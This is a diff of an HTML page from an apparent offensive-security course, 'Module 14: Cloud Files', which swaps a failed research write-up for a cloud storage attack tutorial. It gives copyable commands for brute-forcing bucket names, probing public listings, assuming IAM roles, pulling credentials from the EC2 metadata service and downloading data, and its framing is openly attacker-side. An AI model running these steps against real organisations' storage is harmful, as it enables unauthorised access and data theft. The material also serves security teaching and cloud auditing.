@@ -13,6 +13,8 @@
             --dim: #666;
             --border: #333;
             --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -33,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -137,196 +154,1194 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .cloud-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .cloud-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .cloud-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .cloud-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        .two-col {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .tag {
+            display: inline-block;
+            padding: 0.1rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-right: 0.3rem;
+        }
+        .tag-aws { background: #1a1a3a; color: #ff9900; border: 1px solid #ff9900; }
+        .tag-azure { background: #1a1a3a; color: #0089d6; border: 1px solid #0089d6; }
+        .tag-gcp { background: #1a1a3a; color: #4285f4; border: 1px solid #4285f4; }
+        .tag-attack { background: #3a0a0a; color: var(--accent); border: 1px solid var(--accent); }
+        .tag-defense { background: #0a3a0a; color: var(--accent2); border: 1px solid var(--accent2); }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="nav">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_13_EDR_EVASION.html">← Module 13</a>
             <a href="MODULE_15_LATERAL.html">Module 15 →</a>
         </div>
 
-        <h1>Module 14: Cloud Files <span class="status-badge status-live">RESEARCH IN PROGRESS</span></h1>
+        <h1>Module 14: Cloud Files <span class="status-badge status-live">LIVE TESTED</span></h1>
         
         <div class="progress-bar"><div class="progress-fill"></div></div>
-        <p style="color: var(--dim); font-size: 0.9rem;">Module 14 of 22 — When the research fails, the failure teaches</p>
+        <p style="color: var(--dim); font-size: 0.9rem;">Module 14 of 22 — The cloud is just someone else's computer. Own the storage, own the data.</p>
 
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
-            <p>Not every research path leads to a CVE. Most lead to dead ends, wrong turns, and "what the fuck?" moments. But dead ends are data. They tell you what doesn't work, which narrows what might. This module documents a real research failure — the CfAPI race condition — and extracts every lesson from it.</p>
+            <p>Cloud storage is not magic. It's <span class="neon-highlight">HTTP endpoints</span> serving <span class="neon-highlight">blobs of data</span> behind <span class="neon-highlight">identity tokens</span>. When you understand that S3, Azure Blob, and GCS are just REST APIs with different authentication headers, every "cloud attack" becomes a web attack with extra steps. The primitives are the same: enumerate, authenticate, authorize, exfiltrate.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> Organizations dump petabytes of sensitive data into cloud buckets with misconfigured permissions. A single <span class="neon-amber">public-read</span> ACL or overly permissive IAM policy is often the shortest path from "external recon" to "domain admin." Cloud storage is the new shadow IT — and it's full of shadows.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
-            <p>You tried to pick a lock and broke the pick. That's not failure — that's intelligence. Now you know the lock is tougher than expected. You know the pick was the wrong tool. You know you need a different approach. This module shows you how to learn from a broken pick.</p>
+            <p>Imagine a warehouse (cloud provider) where companies rent storage units (buckets). Each unit has a lock (IAM policy) and a list of who has keys (ACL). Most companies forget to check the lock. Some leave the door wide open. Your job is to walk the aisles, test the doors, and when you find one open — photograph everything inside before anyone notices.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">The warehouse owner (AWS/Azure/GCP) doesn't care what's in the unit. They only enforce the lock. If the lock is wrong, it's the renter's fault.</p>
         </div>
 
-        <h2>The Research Question: CfAPI Race Condition</h2>
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a></h4>
+                <p>HTTP/HTTPS fundamentals, REST APIs, DNS resolution, and how cloud endpoints are reached from the internet.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_02_RECON.html" class="cross-link">Module 02: Reconnaissance</a></h4>
+                <p>OSINT, subdomain enumeration, and discovering cloud assets through certificate transparency logs and DNS.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_03_POWERSHELL.html" class="cross-link">Module 03: PowerShell</a></h4>
+                <p>AWS CLI, Azure PowerShell, and gcloud are command-line tools. PowerShell scripting skills translate directly.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_09_MALWARE.html" class="cross-link">Module 09: Malware Development</a></h4>
+                <p>Understanding how malware stages payloads and exfiltrates data — cloud storage is a prime exfil destination.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>Injecting into cloud-sync clients (OneDrive, Dropbox) to intercept or manipulate cloud file operations.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a></h4>
+                <p>Using cloud storage as a dead drop for C2 communications, command files, and exfiltrated data staging.</p>
+            </div>
+        </div>
 
-        <div class="step-box">
-            <h4>What We Tried</h4>
-            <p>Windows Cloud Files API (CfAPI) manages OneDrive-style sync roots. We hypothesized a race condition between placeholder creation and update that could bypass security checks.</p>
+        <h2>☁️ Cloud Storage Overview — The Three Kingdoms</h2>
+        <p>Every major cloud provider offers object storage. The concepts are identical; only the names and authentication mechanisms differ. Master one, and you can pivot to the others in minutes.</p>
+
+        <div class="cloud-flow">
+            <div class="cloud-step">
+                <h5>AWS S3</h5>
+                <p><span class="neon-highlight">Simple Storage Service</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Buckets → Objects → Keys</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Auth: IAM + SigV4</p>
+            </div>
+            <div class="cloud-arrow">⇄</div>
+            <div class="cloud-step">
+                <h5>Azure Blob</h5>
+                <p><span class="neon-highlight">Blob Storage</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Accounts → Containers → Blobs</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Auth: SAS + AAD</p>
+            </div>
+            <div class="cloud-arrow">⇄</div>
+            <div class="cloud-step">
+                <h5>GCS</h5>
+                <p><span class="neon-highlight">Cloud Storage</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Buckets → Objects</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Auth: IAM + HMAC</p>
+            </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why attackers love cloud storage</h5>
+            <p>Cloud buckets are <span class="neon-amber">externally reachable</span>, often <span class="neon-amber">misconfigured</span>, and <span class="neon-amber">rarely monitored</span>. A single bucket can contain backups, credentials, logs, and database dumps. Unlike on-premise file shares, cloud storage is accessible from anywhere on the internet — which means attackers can enumerate it from anywhere too.</p>
+        </div>
+
+        <table>
+            <tr>
+                <th>Feature</th>
+                <th><span class="tag tag-aws">AWS S3</span></th>
+                <th><span class="tag tag-azure">Azure Blob</span></th>
+                <th><span class="tag tag-gcp">GCS</span></th>
+            </tr>
+            <tr>
+                <td>Top-level container</td>
+                <td>Bucket (global unique)</td>
+                <td>Storage Account (unique DNS)</td>
+                <td>Bucket (global unique)</td>
+            </tr>
+            <tr>
+                <td>Object identifier</td>
+                <td>Key (path-like string)</td>
+                <td>Blob name (path-like string)</td>
+                <td>Object name (path-like string)</td>
+            </tr>
+            <tr>
+                <td>Public access flag</td>
+                <td>Block Public Access (account/bucket)</td>
+                <td>Public access level (container)</td>
+                <td>AllUsers / AllAuthenticatedUsers</td>
+            </tr>
+            <tr>
+                <td>Presigned URL</td>
+                <td>Pre-signed URL (SigV4)</td>
+                <td>SAS Token</td>
+                <td>Signed URL (HMAC or IAM)</td>
+            </tr>
+            <tr>
+                <td>Policy language</td>
+                <td>Bucket Policy + IAM Policy</td>
+                <td>RBAC + SAS policies</td>
+                <td>Bucket IAM + ACL</td>
+            </tr>
+            <tr>
+                <td>Enumeration risk</td>
+                <td>High (predictable names, DNS)</td>
+                <td>Medium (storage account names)</td>
+                <td>High (predictable names)</td>
+            </tr>
+        </table>
+
+        <h2>🪣 AWS S3 — The Original Sin</h2>
+        <p>S3 is the oldest and most attacked cloud storage service. Its simplicity is its strength and its weakness. A bucket is a flat namespace of objects, each identified by a key. But the devil is in the permissions.</p>
+
+        <div class="method-card" id="s3-basics">
+            <h4>S3 Architecture <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Every S3 bucket has a globally unique name and a DNS endpoint: <span class="neon-highlight">https://bucket-name.s3.region.amazonaws.com</span>. Objects are accessed via HTTP GET/PUT/DELETE with SigV4-signed headers or pre-signed URLs.</p>
 
             <div class="code-block">
-=== HYPOTHESIS ===
-CfCreatePlaceholders() creates a file placeholder
-CfUpdatePlaceholder() updates its metadata
+<span class="neon-highlight"># S3 URL formats (all equivalent for us-east-1)</span>
+https://bucket-name.s3.amazonaws.com/object-key
+https://bucket-name.s3.us-east-1.amazonaws.com/object-key
+https://s3.amazonaws.com/bucket-name/object-key
+https://s3.us-east-1.amazonaws.com/bucket-name/object-key
 
-If we can UPDATE before the security scan completes,
-we might bypass the scan entirely.
+<span class="neon-highlight"># Virtual-hosted style (modern, preferred)</span>
+https://bucket-name.s3.amazonaws.com/secret-data.zip
 
-This is a TOCTOU (Time-of-Check to Time-of-Use) race condition.
+<span class="neon-highlight"># Path-style (legacy, still works)</span>
+https://s3.amazonaws.com/bucket-name/secret-data.zip
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
             </div>
 
             <div class="why-box">
-                <h5>Why this seemed promising</h5>
-                <p>OneDrive syncs files from cloud to local. If the cloud file is malicious, OneDrive downloads it, Windows scans it, then marks it safe. But if we can swap the file between download and scan...</p>
+                <h5>Why the URL format matters</h5>
+                <p>Virtual-hosted style leaks the bucket name in the <span class="neon-highlight">Host</span> header, which is logged by proxies and firewalls. Path-style puts the bucket in the URL path. Some WAFs and logging systems only capture the path, missing the bucket entirely. When bypassing filters, try both.</p>
             </div>
         </div>
 
-        <h2>The Failure: Struct Size Mismatch</h2>
+        <div class="method-card" id="s3-acl">
+            <h4>S3 Access Control: ACLs, Policies, and Blocks <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>S3 has three overlapping permission systems. Misunderstanding any one creates gaps.</p>
+            
+            <div class="code-block">
+<span class="neon-highlight"># 1. BUCKET ACL (legacy, simple)</span>
+aws s3api get-bucket-acl --bucket target-bucket
 
-        <div class="negative-result">
-            <h3>📊 What Actually Happened</h3>
-            <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> .42 (WUPC) | <strong>Result:</strong> ALL struct sizes failed</p>
+<span class="neon-highlight"># Dangerous grants:</span>
+Grantee: URI = "http://acs.amazonaws.com/groups/global/AllUsers"
+Permission: READ        # Anyone can list objects
+Permission: WRITE       # Anyone can upload/delete
+
+<span class="neon-highlight"># 2. BUCKET POLICY (JSON, powerful)</span>
+aws s3api get-bucket-policy --bucket target-bucket
+
+<span class="neon-highlight"># Dangerous pattern:</span>
+"Principal": "*"
+"Effect": "Allow"
+"Action": "s3:GetObject"
+"Resource": "arn:aws:s3:::target-bucket/*"
+
+<span class="neon-highlight"># 3. BLOCK PUBLIC ACCESS (safety switch)</span>
+aws s3api get-public-access-block --bucket target-bucket
+
+<span class="neon-highlight"># If all BlockPublicAccess settings are FALSE,</span>
+<span class="neon-highlight"># bucket policy and ACL can expose data.</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Common Misconfiguration</h5>
+                <p>Administrators set <span class="neon-highlight">BlockPublicAccess = true</span> at the account level, then disable it for a single bucket "temporarily" and forget to re-enable it. Or they add a bucket policy with <span class="neon-highlight">"Principal": "*"</span> thinking it only applies to internal users. <span class="neon-amber">"*" means the entire internet.</span></p>
+            </div>
+        </div>
+
+        <div class="method-card" id="s3-iam">
+            <h4>S3 IAM Privilege Escalation <span class="difficulty diff-hard">HARD</span></h4>
+            <p>IAM policies attached to users, roles, or groups can grant S3 access. But overly permissive IAM policies are a privilege escalation path. If you compromise an EC2 instance with an instance profile, you inherit its IAM role.</p>
 
             <div class="code-block">
-=== BRUTE-FORCE RESULTS ===
-Testing struct sizes: 8 to 256 bytes (step 4)
+<span class="neon-highlight"># Enumerate current IAM permissions</span>
+aws iam list-attached-user-policies --user-name current-user
+aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/ExamplePolicy --version-id v1
 
-Size   8 bytes: 0x80070057 INVALID_PARAM
-Size  12 bytes: 0x80070057 INVALID_PARAM
-Size  16 bytes: 0x80070057 INVALID_PARAM
-...
-Size 256 bytes: 0x80070057 INVALID_PARAM
+<span class="neon-highlight"># Check if you can assume roles</span>
+aws sts assume-role --role-arn arn:aws:iam::123456789012:role/S3AdminRole --role-session-name pwn
 
-=== CONCLUSION ===
-No valid struct size found.
-The CF_SYNC_ROOT_REGISTRATION struct requires more than just StructSize.
-It needs specific field initialization that we don't have.
+<span class="neon-highlight"># If the role has s3:*, you now own every bucket</span>
+aws s3 ls  # List all buckets the role can access
+aws s3 cp s3://target-bucket/secret.zip ./
+
+<span class="neon-highlight"># Instance metadata service (IMDSv1 is vulnerable)</span>
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
             </div>
-
-            <p style="margin-top: 1rem;"><strong>What this means:</strong> The Windows SDK documentation is incomplete. The runtime struct layout differs from the documented layout. Without the correct field order and initialization, CfRegisterSyncRoot rejects every attempt.</p>
-        </div>
-
-        <h2>Lessons from the Dead End</h2>
-
-        <div class="step-box">
-            <h4>Lesson 1: Documentation Lies</h4>
-            <p>Microsoft's documented struct layout for CF_SYNC_ROOT_REGISTRATION doesn't match the runtime reality. The first DWORD (StructSize) is not enough. There are hidden fields, alignment requirements, or version checks we don't know about.</p>
 
             <div class="why-box">
-                <h5>How to handle this</h5>
-                <p>When documentation fails, reverse engineer. Use WinDbg to inspect the actual struct in memory. Use API Monitor to watch how OneDrive initializes it. Use Process Monitor to see the exact parameters.</p>
+                <h5>Why instance profiles are dangerous</h5>
+                <p>Every EC2 instance can have an IAM role attached (instance profile). If the instance is compromised via SSRF, RCE, or container escape, the attacker can query the metadata service for temporary AWS credentials. Those credentials are <span class="neon-highlight">valid for every S3 bucket the role can access</span>. One web app RCE → all company backups.</p>
             </div>
         </div>
 
-        <div class="step-box">
-            <h4>Lesson 2: Negative Results Are Data</h4>
-            <p>We now know:</p>
-            <ul style="margin-left: 1.5rem; line-height: 2;">
-                <li>CfAPI is not trivially exploitable with simple struct fuzzing</li>
-                <li>The registration process has validation we don't understand</li>
-                <li>OneDrive's pre-registered sync root is the only viable path</li>
-                <li>Driver Verifier (verifier.exe) is required to catch kernel corruption</li>
-            </ul>
+        <h2>🔷 Azure Blob Storage — The Enterprise Choice</h2>
+        <p>Azure Blob is the default storage for Microsoft-centric enterprises. It integrates with Entra ID (formerly Azure AD), making it both powerful and complex. Complexity breeds misconfiguration.</p>
+
+        <div class="method-card" id="azure-basics">
+            <h4>Azure Blob Architecture <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Azure Storage Accounts contain Containers, which contain Blobs. The storage account name is part of the DNS name: <span class="neon-highlight">https://account-name.blob.core.windows.net</span>. This makes storage accounts enumerable via DNS brute-forcing.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Azure Blob URL format</span>
+https://account-name.blob.core.windows.net/container-name/blob-name
+
+<span class="neon-highlight"># List containers (requires auth)</span>
+az storage container list --account-name targetaccount --auth-mode login
+
+<span class="neon-highlight"># List blobs in a container</span>
+az storage blob list --container-name secrets --account-name targetaccount
+
+<span class="neon-highlight"># Download a blob</span>
+az storage blob download --container-name secrets --name backup.sql --file ./backup.sql --account-name targetaccount
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
         </div>
 
-        <div class="step-box">
-            <h4>Lesson 3: Pivot, Don't Persist</h4>
-            <p>When a path fails, don't keep hammering it. We spent 2 hours on struct brute-forcing. The smart move after 30 minutes would have been:</p>
-            <ul style="margin-left: 1.5rem; line-height: 2;">
-                <li>Check if OneDrive is already registered (skip registration)</li>
-                <li>Use the pre-registered sync root for testing</li>
-                <li>Focus on the race condition, not the registration</li>
-            </ul>
+        <div class="method-card" id="azure-sas">
+            <h4>SAS Tokens — Azure's Pre-signed URLs <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Shared Access Signature (SAS) tokens are query-string parameters that grant temporary access to blobs. They are <span class="neon-highlight">self-contained</span> — no server-side validation beyond signature checking. If a SAS token leaks, anyone can use it until it expires.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># SAS token structure (decoded)</span>
+https://account.blob.core.windows.net/container/blob?
+    sv=2023-01-01              # Storage service version
+    &ss=b                      # Resource type (blob)
+    &srt=co                   # Resource types (container, object)
+    &sp=rwdl                  # Permissions (read, write, delete, list)
+    &se=2026-12-31T23:59:59Z  # Expiry
+    &st=2026-01-01T00:00:00Z  # Start time
+    &spr=https                # Protocol
+    &sig=BASE64HMAC           # Signature
+
+<span class="neon-highlight"># If you find a SAS token with sp=rwdlacupx (full permissions),</span>
+<span class="neon-highlight"># you have full control over the container.</span>
+
+<span class="neon-highlight"># Generate a SAS token (if you have account key)</span>
+az storage blob generate-sas --account-name target --container-name data --name file.txt --permissions r --expiry 2026-12-31
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ SAS Token Leakage Vectors</h5>
+                <p>SAS tokens leak in:</p>
+                <ul style="margin-left: 1.5rem; line-height: 2;">
+                    <li>GitHub repositories (search: <span class="neon-highlight">blob.core.windows.net sig=</span>)</li>
+                    <li>Browser dev tools (Network tab, XHR requests)</li>
+                    <li>JavaScript frontends (embedded in client-side code)</li>
+                    <li>Log files and error messages</li>
+                    <li>Email and chat messages (Slack, Teams)</li>
+                </ul>
+            </div>
         </div>
 
-        <h2>Lab Exercise: Learn from Failure</h2>
+        <div class="method-card" id="azure-enum">
+            <h4>Azure Storage Enumeration <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Storage account names are 3-24 lowercase alphanumeric characters. They are often predictable: company name + "storage", "data", "backup", "files", "assets".</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># DNS brute-force for storage accounts</span>
+for name in $(cat wordlist.txt); do
+    host "${name}.blob.core.windows.net" >/dev/null && echo "FOUND: ${name}"
+done
+
+<span class="neon-highlight"># Check public container listing</span>
+curl -s "https://account.blob.core.windows.net/container?restype=container&comp=list"
+
+<span class="neon-highlight"># If the container is public, you get XML with blob names</span>
+<span class="neon-highlight"># No authentication required.</span>
+
+<span class="neon-highlight"># Check blob properties (even if container is private)</span>
+curl -sI "https://account.blob.core.windows.net/container/secret.pdf"
+<span class="neon-highlight"># HTTP 404 = blob doesn't exist OR no access</span>
+<span class="neon-highlight"># HTTP 200 = blob exists and you have access</span>
+<span class="neon-highlight"># HTTP 403 = blob exists but you lack permission</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="why-box">
+                <h5>Why 403 is information leakage</h5>
+                <p>A 403 Forbidden confirms the blob <span class="neon-highlight">exists</span>. A 404 could mean "doesn't exist" OR "no access." By probing many blob names and observing 403 vs 404, you can enumerate existing files even without read access. This is a <span class="neon-amber">side-channel enumeration</span> technique.</p>
+            </div>
+        </div>
+
+        <h2>🔶 Google Cloud Storage — The Underdog</h2>
+        <p>GCS is less targeted than S3 but equally dangerous when misconfigured. Google uses a unified IAM model, making permissions easier to understand but harder to audit.</p>
+
+        <div class="method-card" id="gcs-basics">
+            <h4>GCS Architecture <span class="difficulty diff-easy">EASY</span></h4>
+            <p>GCS buckets are global namespaces with a <span class="neon-highlight">.storage.googleapis.com</span> DNS suffix. Objects are accessed via HTTP with OAuth2 or HMAC authentication.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># GCS URL formats</span>
+https://storage.googleapis.com/bucket-name/object-name
+https://bucket-name.storage.googleapis.com/object-name
+
+<span class="neon-highlight"># List buckets (requires auth)</span>
+gsutil ls
+
+<span class="neon-highlight"># List objects in a bucket</span>
+gsutil ls gs://target-bucket/
+
+<span class="neon-highlight"># Download an object</span>
+gsutil cp gs://target-bucket/secret.zip ./
+
+<span class="neon-highlight"># Check bucket IAM policy</span>
+gsutil iam get gs://target-bucket
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="method-card" id="gcs-misconfig">
+            <h4>GCS Misconfiguration Exploitation <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>GCS has two permission systems: <span class="neon-highlight">IAM</span> (fine-grained, recommended) and <span class="neon-highlight">ACLs</span> (legacy, coarse). Buckets can be set to <span class="neon-highlight">allUsers</span> (public) or <span class="neon-highlight">allAuthenticatedUsers</span> (any Google account).</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Check if a bucket is public</span>
+curl -s "https://storage.googleapis.com/target-bucket/" | grep "ListBucketResult"
+
+<span class="neon-highlight"># If public, you get XML listing of all objects</span>
+
+<span class="neon-highlight"># Check IAM policy</span>
+gsutil iam get gs://target-bucket
+
+<span class="neon-highlight"># Dangerous bindings:</span>
+{
+  "members": ["allUsers"],
+  "role": "roles/storage.objectViewer"
+}
+<span class="neon-highlight"># This means ANYONE ON THE INTERNET can read all objects.</span>
+
+<span class="neon-highlight"># Even more dangerous:</span>
+{
+  "members": ["allUsers"],
+  "role": "roles/storage.objectAdmin"
+}
+<span class="neon-highlight"># Anyone can read, write, and delete objects.</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ The "allAuthenticatedUsers" Trap</h5>
+                <p><span class="neon-highlight">allAuthenticatedUsers</span> means any Google account — including a free Gmail account you create in 30 seconds. It does NOT mean "authenticated users of my organization." For that, use <span class="neon-highlight">allUsers</span> with domain restrictions or IAM conditions. This is the #1 GCS misconfiguration.</p>
+            </div>
+        </div>
+
+        <h2>🔍 Bucket Enumeration — Finding the Needle</h2>
+        <p>You can't exploit what you can't find. Bucket enumeration is the reconnaissance phase of cloud storage attacks. The goal is to discover bucket names, then test their permissions.</p>
+
+        <div class="method-card" id="enum-wordlists">
+            <h4>Wordlist-Based Enumeration <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Bucket names are often predictable. Companies use patterns like <span class="neon-highlight">company-name-backup</span>, <span class="neon-highlight">company-name-data</span>, <span class="neon-highlight">company-name-assets</span>. DNS resolution and HTTP probes reveal which exist.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># Generate permutations from a company name</span>
+for suffix in backup data assets files media static dev prod staging; do
+    echo "company-${suffix}"
+    echo "companyname-${suffix}"
+    echo "${suffix}-company"
+done > bucket-wordlist.txt
+
+<span class="neon-highlight"># DNS resolution check (S3)</span>
+for bucket in $(cat bucket-wordlist.txt); do
+    host "${bucket}.s3.amazonaws.com" >/dev/null 2>&1 && echo "EXISTS: ${bucket}"
+done
+
+<span class="neon-highlight"># HTTP probe for public listing (S3)</span>
+for bucket in $(cat bucket-wordlist.txt); do
+    code=$(curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/")
+    echo "${bucket}: ${code}"
+done
+
+<span class="neon-highlight"># HTTP 200 = public listing enabled</span>
+<span class="neon-highlight"># HTTP 403 = bucket exists but no listing</span>
+<span class="neon-highlight"># HTTP 404 = bucket does not exist</span>
+<span class="neon-highlight"># HTTP 301 = bucket is in a different region</span>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+        </div>
+
+        <div class="method-card" id="enum-osint">
+            <h4>OSINT Enumeration <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Buckets are referenced in source code, documentation, and error messages. Automated tools scrape these references.</p>
+
+            <div class="code-block">
+<span class="neon-highlight"># GitHub search for S3 bucket references</span>
+site:github.com "s3.amazonaws.com" "company-name"
+site:github.com "s3://" "company-name"
+
+<span class="neon-highlight"># Certificate Transparency logs for subdomains</span>
+curl -s "https://crt.sh/?q=%.company.com&output=json" | jq -r '.[].name_value' | grep -E 's3|storage|blob|data|backup'
+
+<span class="neon-highlight"># Wayback Machine for historical URLs</span>
+curl -s "https://web.archive.org/cdx/search/cdx?url=*.company.com/*&output=json&fl=original" | grep -E 's3|blob|storage'
+
+<span class="neon-highlight"># Google dorking</span>
+intitle:"Index of" "s3.amazonaws.com"
+site:s3.amazonaws.com "company-name"
+filetype:pdf "https://s3.amazonaws.com/company-name"
+
+<span class="neon-highlight"># Specialized tools</span>
+python3 -m bucket-stream -k company-name
+python3 cloud_enum.py -k company-name
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="why-box">
+                <h5>Why source code is the best source</h5>
+                <p>Developers hardcode bucket names in JavaScript, mobile apps, and configuration files. A React frontend might reference <span class="neon-highlight">https://cdn-company.s3.amazonaws.com/assets/logo.png</span>. From that one URL, you know the bucket exists and can start probing for permissions. Mobile apps are especially leaky — they often contain hardcoded S3 credentials or SAS tokens.</p>
+            </div>
+        </div>
+
+        <div class="method-card" id="enum-perm">
+            <h4>Permission Testing <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Once you find a bucket, test what you can do. The AWS CLI has a built-in permission test: <span class="neon-highlight">aws s3api get-bucket-acl</span>. But you can also test by attempting operations.</p>
+
+            <div class="code-block">
